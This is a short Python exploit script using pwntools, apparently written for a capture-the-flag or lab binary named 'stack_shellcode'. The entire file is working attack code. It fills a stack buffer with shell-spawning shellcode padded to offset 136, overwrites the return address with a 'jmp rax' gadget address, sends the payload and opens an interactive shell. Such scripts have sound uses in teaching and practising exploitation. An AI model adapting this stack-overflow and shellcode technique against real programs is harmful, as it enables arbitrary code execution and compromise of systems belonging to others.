from pwn import *

# Setup context
context.binary = ELF('./stack_shellcode', checksec=False)  # Path to the binary
context.log_level = 'debug'

# Start the process
p = process()

# Address of the 'jmp rax' gadget
JMP_RAX = 0x4010ac

# Craft shellcode to spawn a shell
shellcode = asm(shellcraft.sh())  # pwntools built-in shellcraft

# Padding to reach return address
offset = 136  # Calculated using cyclic patterns

# Build payload
payload = shellcode.ljust(offset, b'A')  # Fill buffer with shellcode and padding
payload += p64(JMP_RAX)  # Overwrite return address with jmp rax gadget

# Send payload
p.sendline(payload)

# Interact with the spawned shell
p.interactive()
